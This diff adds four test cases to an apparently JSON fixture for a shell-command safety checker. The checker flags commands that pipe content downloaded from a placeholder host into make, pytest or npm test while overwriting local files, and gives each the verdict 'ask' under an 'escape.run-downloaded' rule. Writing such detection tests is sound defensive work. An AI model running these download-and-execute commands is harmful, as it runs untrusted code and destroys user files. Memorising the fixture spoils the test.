@@ -5825,6 +5825,64 @@
    "downloaded": [
     "C:\\Users\\ana\\proj\\t.jar"
    ]
+  },
+  {
+   "cmd": "(iwr https://h/x).Content | make x > x",
+   "verdict": "ask",
+   "classes": [
+    "escape"
+   ],
+   "rules": [
+    "escape.run-downloaded"
+   ],
+   "missing": [
+    "x"
+   ],
+   "downloaded": [
+    "C:\\Users\\ana\\proj\\d.txt"
+   ]
+  },
+  {
+   "cmd": "curl.exe -s https://h/x | pytest t.py > t.py",
+   "verdict": "ask",
+   "classes": [
+    "escape"
+   ],
+   "rules": [
+    "escape.run-downloaded"
+   ],
+   "missing": [
+    "t.py"
+   ],
+   "downloaded": [
+    "C:\\Users\\ana\\proj\\d.txt"
+   ]
+  },
+  {
+   "cmd": "iwr https://h/x | npm test x.js > x.js",
+   "verdict": "ask",
+   "classes": [
+    "escape"
+   ],
+   "rules": [
+    "escape.run-downloaded"
+   ],
+   "missing": [
+    "x.js"
+   ]
+  },
+  {
+   "cmd": "iwr https://h/x | pytest t.py > t.py",
+   "verdict": "ask",
+   "classes": [
+    "escape"
+   ],
+   "rules": [
+    "escape.run-downloaded"
+   ],
+   "missing": [
+    "t.py"
+   ]
   }
  ]
 }
